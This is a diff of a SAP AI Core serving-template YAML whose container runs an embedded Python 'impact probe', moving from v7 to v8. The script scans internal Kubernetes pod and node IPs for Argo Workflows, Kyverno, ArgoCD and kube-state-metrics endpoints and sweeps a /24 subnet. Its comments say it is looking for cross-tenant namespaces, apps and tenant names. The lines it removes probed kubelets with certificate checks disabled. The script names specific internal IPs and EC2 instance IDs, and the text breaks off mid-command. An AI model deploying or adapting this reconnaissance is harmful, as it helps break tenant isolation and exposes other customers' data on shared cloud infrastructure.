@@ -1,14 +1,14 @@
 apiVersion: ai.sap.com/v1alpha1
 kind: ServingTemplate
 metadata:
-  name: impact-probe-v7
+  name: impact-probe-v8
   labels:
-    scenarios.ai.sap.com/id: "impact-probe-v7"
+    scenarios.ai.sap.com/id: "impact-probe-v8"
     ai.sap.com/version: "1.0.0"
   annotations:
-    scenarios.ai.sap.com/name: "impact-probe-v7"
-    executables.ai.sap.com/name: "impact-probe-v7"
-    executables.ai.sap.com/description: "impact verification probe v7"
+    scenarios.ai.sap.com/name: "impact-probe-v8"
+    executables.ai.sap.com/name: "impact-probe-v8"
+    executables.ai.sap.com/description: "impact verification probe v8"
 spec:
   template:
     apiVersion: "serving.kserve.io/v1beta1"
@@ -28,10 +28,10 @@ spec:
           args:
           - |
             cat > /tmp/probe.py << 'PYEOF'
-            import os, ssl, socket, json, re, base64, time, urllib.request, urllib.error
+            import os, ssl, socket, json, re, time, urllib.request, urllib.error
 
             def report(k, v):
-                print(f"[P7] {k}: {str(v)[:6000]}", flush=True)
+                print(f"[P8] {k}: {str(v)[:6000]}", flush=True)
 
             def http_get(url, headers=None, timeout=10):
                 try:
@@ -49,195 +49,149 @@ spec:
                 except Exception as e:
                     return f"ERR:{e}", 0, {}
 
-            def https_get(url, headers=None, timeout=10):
-                """HTTPS GET skipping certificate validation."""
+            def tcp_open(host, port, timeout=4):
                 try:
-                    req = urllib.request.Request(url, headers=headers or {})
-                    ctx = ssl.create_default_context()
-                    ctx.check_hostname = False
-                    ctx.verify_mode = ssl.CERT_NONE
-                    with urllib.request.urlopen(req, context=ctx, timeout=timeout) as r:
-                        return r.read().decode("utf-8", errors="replace"), r.status, dict(r.headers)
-                except urllib.error.HTTPError as e:
-                    body = ""
-                    try: body = e.read().decode("utf-8", errors="replace")[:1200]
-                    except: pass
-                    return f"HTTP_{e.code}:{body}", e.code, {}
-                except Exception as e:
-                    return f"ERR:{e}", 0, {}
+                    s = socket.socket()
+                    s.settimeout(timeout)
+                    s.connect((host, port))
+                    s.close()
+                    return True
+                except: return False
 
-            # Node IPs confirmed reachable (port 10250 open) from probe v6
-            NODE_IPS = [
-                ("10.180.7.77",   "i-0bd1cce260a84045b", "eu-central-1a"),
-                ("10.180.79.102", "i-000567cf9604d1fa5", "eu-central-1c"),
-                ("10.180.8.165",  "i-0f85db863b5a6b42f", "eu-central-1a"),
+            # ── 1. ARGO WORKFLOWS — probe 100.64.15.16 (503 last time = Istio passes through) ──
+            report("---", "=== ARGO WORKFLOWS PODS (503 = Istio allows) ===")
+            argo_ips = [
+                ("100.64.15.16",  "workflow-controller-1"),   # 503 in v7 - Istio allows
+                ("100.64.0.30",   "workflow-controller-2"),   # from endpointslice
+                ("100.64.80.37",  "workflow-controller-3"),   # from endpointslice
             ]
+            for ip, label in argo_ips:
+                for port in [9090, 2746, 8080, 80, 443, 6443]:
+                    body, code, hdrs = http_get(f"http://{ip}:{port}/", timeout=5)
+                    if code != 0 or "ERR:timed" not in body:
+                        report(f"ARGO_{label}_{ip}:{port}_root", f"[{code}] hdrs={list(hdrs.keys())[:4]} {body[:400]}")
+                    if code == 200 or (code > 0 and code not in (502, 0)):
+                        # Accessible — try API endpoints
+                        for path in ["/metrics", "/api/v1/workflows", "/api/v1/namespaces",
+                                     "/health", "/api", "/api/v1"]:
+                            b2, c2, _ = http_get(f"http://{ip}:{port}{path}", timeout=5)
+                            report(f"ARGO_{label}_{ip}:{port}{path.replace('/','_')}", f"[{c2}] {b2[:800]}")
 
-            # ── 1. KUBELET HTTPS PROBING ─────────────────────────────────────────
-            report("---", "=== KUBELET HTTPS (port 10250) ===")
-            for node_ip, instance_id, az in NODE_IPS:
-                base = f"https://{node_ip}:10250"
-                for path, label in [
-                    ("/healthz",                 "HEALTHZ"),
-                    ("/metrics",                 "METRICS"),
-                    ("/pods",                    "PODS"),
-                    ("/stats/summary",           "STATS"),
-                    ("/stats/",                  "STATS_ROOT"),
-                    ("/spec/",                   "SPEC"),
-                    ("/runningpods/",            "RUNNING_PODS"),
-                    ("/metrics/cadvisor",        "CADVISOR"),
-                    ("/metrics/resource",        "RESOURCE"),
-                    ("/metrics/probes",          "PROBES"),
-                ]:
-                    body, code, hdrs = https_get(f"{base}{path}", timeout=6)
-                    report(f"KUBELET_{node_ip}{path.replace('/','_')}", f"[{code}] {body[:1000]}")
-                    if code == 200 and path == "/pods":
-                        # Parse pod list and extract cross-tenant namespaces
-                        try:
-                            pods_data = json.loads(body)
-                            namespaces = set()
-                            pod_info = []
-                            for item in pods_data.get("items", []):
-                                ns = item.get("metadata", {}).get("namespace", "")
-                                name = item.get("metadata", {}).get("name", "")
-                                containers = [c.get("image","") for c in item.get("spec",{}).get("containers",[])]
-                                namespaces.add(ns)
-                                pod_info.append(f"{ns}/{name}: {containers[:2]}")
-                            report(f"KUBELET_{node_ip}_NAMESPACES", str(sorted(namespaces)))
-                            report(f"KUBELET_{node_ip}_POD_SAMPLE", "\n".join(pod_info[:30]))
-                        except Exception as e:
-                            report(f"KUBELET_{node_ip}_PODS_PARSE_ERR", str(e))
-
-            # ── 2. KUBE-PROXY METRICS ON NODE IPs ────────────────────────────────
-            report("---", "=== KUBE-PROXY METRICS ON NODE IPs ===")
-            for node_ip, _, _ in NODE_IPS:
-                body, code, _ = http_get(f"http://{node_ip}:10249/metrics", timeout=6)
+            # ── 2. KYVERNO METRICS (policy engine — might expose denied resources) ──
+            report("---", "=== KYVERNO POLICY ENGINE ===")
+            kyverno_ips = [
+                ("100.64.0.68",  8000, "kyverno-service-1"),
+                ("100.64.0.59",  8000, "kyverno-service-2"),
+                ("100.64.0.62",  8000, "kyverno-service-3"),
+                ("100.64.0.74",  8000, "kyverno-bg-ctrl-1"),
+                ("100.64.80.32", 8000, "kyverno-bg-ctrl-2"),
+            ]
+            for ip, port, label in kyverno_ips[:3]:
+                body, code, hdrs = http_get(f"http://{ip}:{port}/metrics", timeout=6)
                 if code == 200:
                     lines = body.split("\n")
-                    # Look for iptables rules, service endpoints, node IPs
-                    proxy_lines = [l for l in lines if not l.startswith("#") and l.strip()][:50]
-                    report(f"KUBE_PROXY_{node_ip}_metrics", "\n".join(proxy_lines[:30]))
-                    # Extract any IPs in the proxy metrics
-                    ips = re.findall(r"(\d+\.\d+\.\d+\.\d+)", body)
-                    report(f"KUBE_PROXY_{node_ip}_ips", str(list(dict.fromkeys(ips))[:50]))
+                    # Look for policy admission events with resource details
+                    policy_lines = [l for l in lines
+                                    if "kyverno" in l.lower() and not l.startswith("#") and l.strip()]
+                    report(f"KYVERNO_{ip}_{label}_policy_metrics", "\n".join(policy_lines[:40]))
+                    # Also look for admission counts by resource type
+                    admission_lines = [l for l in lines if "admission" in l.lower() and not l.startswith("#")]
+                    report(f"KYVERNO_{ip}_admission", "\n".join(admission_lines[:20]))
                 else:
-                    report(f"KUBE_PROXY_{node_ip}", f"[{code}] {body[:150]}")
-                # Also try /configz
-                body2, code2, _ = http_get(f"http://{node_ip}:10249/configz", timeout=5)
-                report(f"KUBE_PROXY_{node_ip}_configz", f"[{code2}] {body2[:500]}")
+                    report(f"KYVERNO_{ip}:{port}", f"[{code}] {body[:150]}")
 
-            # ── 3. POD IPs FROM OTEL ENDPOINTSLICES (newly discovered) ──────────
-            report("---", "=== POD IPs FROM OTEL ENDPOINTSLICES ===")
-            # These pod IPs were in the OTel TA endpointslices job output from v6
-            pod_targets = [
-                ("100.64.80.49", 8082, "argocd-application-controller-metrics"),
-                ("100.64.15.16",  9090, "unknown-svc-9090"),
-                ("100.64.109.17", 15090, "istio-metrics"),
-                # Pull fresh endpointslices to discover more
+            # ── 3. ARGOCD METRICS VIA DIRECT POD IPs ─────────────────────────────
+            report("---", "=== ARGOCD METRICS (endpointslice IPs) ===")
+            argocd_targets = [
+                ("100.64.80.49",  8082, "app-ctrl-argocd"),
+                ("100.64.80.49",  8083, "server-argocd"),
+                ("100.64.0.78",   8082, "app-ctrl-argocd-2"),
+                ("100.64.0.64",   8083, "server-argocd-2"),
+                ("100.64.0.72",   8084, "repo-server-argocd"),
+                ("100.64.80.231", 8082, "app-ctrl-tenants"),
+                ("100.64.84.216", 8083, "server-tenants"),
+                ("100.64.84.215", 8084, "repo-tenants"),
+                ("100.64.92.189", 8082, "app-ctrl-tenants-2"),
             ]
-            for ip, port, label in pod_targets:
-                body, code, hdrs = http_get(f"http://{ip}:{port}/", timeout=6)
-                report(f"POD_{ip}:{port}_{label}_root", f"[{code}] hdrs={list(hdrs.keys())[:4]} {body[:400]}")
-                if code not in (0,) and "ERR" not in body[:4]:
-                    for path in ["/metrics", "/api/v1/query?query=up", "/health"]:
-                        b2, c2, _ = http_get(f"http://{ip}:{port}{path}", timeout=6)
-                        report(f"POD_{ip}:{port}{path.replace('/','_')}", f"[{c2}] {b2[:800]}")
-
-            # ── 4. FULL ENDPOINTSLICE JOB DUMP ───────────────────────────────────
-            report("---", "=== FULL ENDPOINTSLICE TARGETS ===")
-            ta_base = "http://otel-scraper-targetallocator.opentelemetry.svc.cluster.local:80"
-            body_es, code_es, _ = http_get(f"{ta_base}/jobs/kubernetes-endpointslices/targets", timeout=20)
-            if code_es == 200:
-                try:
-                    data = json.loads(body_es)
-                    targets = []
-                    for cid, cdata in data.items():
-                        for tg in cdata.get("targets", []):
-                            for t in tg.get("targets", []):
-                                lbl = tg.get("labels", {})
-                                ns  = lbl.get("__meta_kubernetes_namespace", "")
-                                svc = lbl.get("__meta_kubernetes_endpointslice_label_kubernetes_io_service_name", "")
-                                img = lbl.get("__meta_kubernetes_pod_container_image", "")
-                                pod_ip = lbl.get("__meta_kubernetes_pod_ip", "")
-                                targets.append(f"{t} ns={ns} svc={svc} ip={pod_ip} img={img[:80]}")
-                    for tgt in targets[:80]:
-                        report("ES_TARGET", tgt)
-                except Exception as e:
-                    report("ES_PARSE_ERR", str(e))
-
-            # ── 5. ADDITIONAL NODE IPs FROM KSM (extend scan) ────────────────────
-            report("---", "=== EXTENDED NODE SCAN ===")
-            # More node IPs from KSM in probe v6 — pick ones in different AZs
-            extra_nodes = [
-                "10.180.13.45",   # eu-central-1a  (from OTel TA node targets)
-                "10.180.12.215",  # eu-central-1a  (from OTel TA node targets)
-                "10.180.69.8",    # eu-central-1c  i-0b9393ca2a42b68a0
-            ]
-            for node_ip in extra_nodes:
-                # TCP check first
-                for port, label in [(10250, "kubelet"), (10249, "kube-proxy"), (9100, "node-exp")]:
-                    try:
-                        s = socket.socket()
-                        s.settimeout(3)
-                        s.connect((node_ip, port))
-                        s.close()
-                        open_str = "OPEN"
-                    except:
-                        open_str = "CLOSED"
-                    report(f"EXTRA_NODE_{node_ip}:{port}_{label}", open_str)
-                # If kubelet is reachable, try HTTPS
-                body, code, _ = https_get(f"https://{node_ip}:10250/healthz", timeout=5)
-                report(f"EXTRA_KUBELET_{node_ip}_healthz", f"[{code}] {body[:200]}")
-                body2, code2, _ = https_get(f"https://{node_ip}:10250/pods", timeout=8)
-                report(f"EXTRA_KUBELET_{node_ip}_pods", f"[{code2}] {body2[:200]}")
-
-            # ── 6. ARGOCD METRICS DEEP PROBE ─────────────────────────────────────
-            report("---", "=== ARGOCD APPLICATION METRICS ===")
-            # ArgoCD server metrics might expose cross-tenant app info
-            argocd_metric_ips = [
-                ("100.64.80.49", 8082, "argocd-application-controller"),
-                ("100.64.80.49", 8083, "argocd-application-controller-alt"),
-            ]
-            for ip, port, label in argocd_metric_ips:
-                body, code, _ = http_get(f"http://{ip}:{port}/metrics", timeout=8)
+            for ip, port, label in argocd_targets:
+                body, code, _ = http_get(f"http://{ip}:{port}/metrics", timeout=5)
                 if code == 200:
                     lines = body.split("\n")
-                    # Look for argocd_app_ metrics that expose tenant apps
+                    # Extract ArgoCD application sync metrics (cross-tenant)
                     app_lines = [l for l in lines
-                                 if ("argocd_app" in l or "argocd_cluster" in l)
+                                 if ("argocd_app" in l or "argocd_repo" in l or "argocd_cluster" in l)
                                  and not l.startswith("#") and l.strip()]
-                    report(f"ARGOCD_{ip}:{port}_app_metrics", "\n".join(app_lines[:50]))
-                    # Also export all metric names
-                    metric_names = list({l.split("{")[0].split(" ")[0] for l in lines
-                                         if not l.startswith("#") and l.strip()})
-                    report(f"ARGOCD_{ip}:{port}_metric_names", str(metric_names[:50]))
+                    report(f"ARGOCD_{label}_{ip}_app_metrics", "\n".join(app_lines[:60]))
+                    metric_names = sorted({l.split("{")[0].split(" ")[0]
+                                           for l in lines if not l.startswith("#") and l.strip()})
+                    report(f"ARGOCD_{label}_{ip}_metric_names", str(metric_names[:30]))
                 else:
-                    report(f"ARGOCD_{ip}:{port}", f"[{code}] {body[:200]}")
+                    report(f"ARGOCD_{ip}:{port}_{label}", f"[{code}] {body[:100]}")
 
-            # ── 7. OTEL TA FULL NODES TARGET DATA ────────────────────────────────
-            report("---", "=== OTEL TA NODES TARGETS (all) ===")
-            body_n, code_n, _ = http_get(f"{ta_base}/jobs/kubernetes-nodes/targets", timeout=20)
-            if code_n == 200:
-                try:
-                    data_n = json.loads(body_n)
-                    for cid, cdata in data_n.items():
-                        for tg in cdata.get("targets", []):
-                            for addr in tg.get("targets", []):
-                                lbl = tg.get("labels", {})
-                                az = lbl.get("__meta_kubernetes_node_label_topology_kubernetes_io_zone", "")
-                                itype = lbl.get("__meta_kubernetes_node_label_node_kubernetes_io_instance_type", "")
-                                iid = ""
-                                # Get instance ID from csi annotation
-                                csi = lbl.get("__meta_kubernetes_node_annotation_csi_volume_kubernetes_io_nodeid", "")
-                                if csi:
-                                    try: iid = json.loads(csi).get("ebs.csi.aws.com", "")
-                                    except: pass
-                                node_name = lbl.get("__meta_kubernetes_node_address_InternalIP", "")
-                                report(f"NODE_TARGET", f"addr={addr} ip={node_name} az={az} type={itype} ec2={iid}")
-                except Exception as e:
-                    report("NODES_PARSE_ERR", str(e))
+            # ── 4. ARGO WORKFLOW SERVER API (port 2746) ───────────────────────────
+            report("---", "=== ARGO WORKFLOW SERVER ===")
+            # Try to find the Argo server (different from controller)
+            argo_server_ips = ["100.64.0.30", "100.64.80.37", "100.64.15.16"]
+            for ip in argo_server_ips:
+                for port in [2746, 443, 80, 8080]:
+                    body, code, hdrs = http_get(f"http://{ip}:{port}/api/v1/info", timeout=5)
+                    if code not in (0,) and "ERR:timed" not in body:
+                        report(f"ARGO_SERVER_{ip}:{port}_info", f"[{code}] {body[:400]}")
+                # Also gRPC check
+                if tcp_open(ip, 2746, timeout=3):
+                    report(f"ARGO_SERVER_{ip}:2746_tcp", "OPEN")
 
-            report("DONE", "probe v7 complete")
+            # ── 5. KSM CUSTOM — ResourceGroup CRDs (cross-tenant names) ──────────
+            report("---", "=== KSM CUSTOM (ResourceGroup CRDs) ===")
+            ksm_custom = "http://ksm-custom-kube-state-metrics.opentelemetry.svc.cluster.local:8080/metrics"
+            body_c, code_c, _ = http_get(ksm_custom, timeout=15)
+            if code_c == 200:
+                lines = body_c.split("\n")
+                rg_lines = [l for l in lines
+                            if "resource_group" in l.lower() and not l.startswith("#") and l.strip()]
+                report("KSM_CUSTOM_RG_LINES", "\n".join(rg_lines[:100]))
+                # Also get tenant info
+                tenant_lines = [l for l in lines
+                                if "tenant" in l.lower() and not l.startswith("#") and l.strip()]
+                report("KSM_CUSTOM_TENANT_LINES", "\n".join(tenant_lines[:50]))
+            else:
+                report("KSM_CUSTOM_ERR", f"[{code_c}] {body_c[:200]}")
+
+            # ── 6. SERVING NAMESPACE PODS (our own namespace pods) ───────────────
+            report("---", "=== SERVING NAMESPACE DISCOVERY ===")
+            # Find pod IPs in our tenant namespace (those should be reachable without Istio block)
+            # Our pod IP is 100.64.105.10 — scan nearby IPs in /24
+            our_ip = "100.64.105.10"
+            subnet = ".".join(our_ip.split(".")[:3])
+            report("OUR_SUBNET", f"{subnet}.0/24")
+            # Scan a subset of nearby IPs
+            reachable = []
+            for i in range(1, 50):
+                target_ip = f"{subnet}.{i}"
+                if target_ip == our_ip:
+                    continue
+                for port in [80, 8080, 5000]:
+                    if tcp_open(target_ip, port, timeout=2):
+                        reachable.append(f"{target_ip}:{port}")
+                        body, code, hdrs = http_get(f"http://{target_ip}:{port}/", timeout=3)
+                        report(f"SUBNET_{target_ip}:{port}", f"[{code}] {body[:200]}")
+            report("SUBNET_REACHABLE", str(reachable))
+
+            # ── 7. ARGO WORKFLOW METRICS DEEP DIVE ───────────────────────────────
+            report("---", "=== ARGO WORKFLOW METRICS DEEP ===")
+            for ip, label in [("100.64.15.16", "wf-ctrl"), ("100.64.0.30", "wf-ctrl-2")]:
+                body, code, _ = http_get(f"http://{ip}:9090/metrics", timeout=8)
+                if code == 200:
+                    lines = body.split("\n")
+                    wf_lines = [l for l in lines
+                                if "argo" in l.lower() and not l.startswith("#") and l.strip()]
+                    report(f"ARGO_WF_{ip}_metrics", "\n".join(wf_lines[:50]))
+                    ns_lines = [l for l in lines if "namespace" in l.lower() and not l.startswith("#")]
+                    report(f"ARGO_WF_{ip}_ns_lines", "\n".join(ns_lines[:20]))
+                else:
+                    report(f"ARGO_WF_{ip}:9090", f"[{code}] {body[:200]}")
+
+            report("DONE", "probe v8 complete")
             PYEOF
             python3 /tmp/probe.py 2>&1
             python3 -c "
